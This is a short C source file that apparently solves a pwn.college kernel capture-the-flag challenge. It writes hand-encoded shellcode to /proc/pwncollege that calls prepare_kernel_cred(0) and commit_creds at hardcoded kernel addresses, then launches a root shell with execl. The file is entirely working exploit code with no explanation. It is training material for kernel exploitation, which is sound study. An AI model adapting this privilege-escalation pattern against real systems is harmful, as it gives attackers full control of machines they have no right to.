#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

void get_root() {
	commit_creds(prepare_kernel_cred(0));
	return;
}

int main() {
	//void *shellcode = get_root;
	int fd = open("/proc/pwncollege", O_WRONLY);
	assert(fd > 0);
	prepare_kernel_cred = (prepare_kernel_cred_t) 0xffffffff810890d0;
	commit_creds = (commit_creds_t) 0xffffffff81088d90;
	// asm("xor rdi, rdi; mov rax, 0xffffffff810890d0; call rax; mov rdi, rax; mov rax, 0xffffffff81088d90; call rax; ret")
	char shellcode[] = "H1\xffH\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
	write(fd, shellcode, 25);
	// we are root now
	execl("/bin/sh", "/bin/sh", NULL);

	return 0;
}
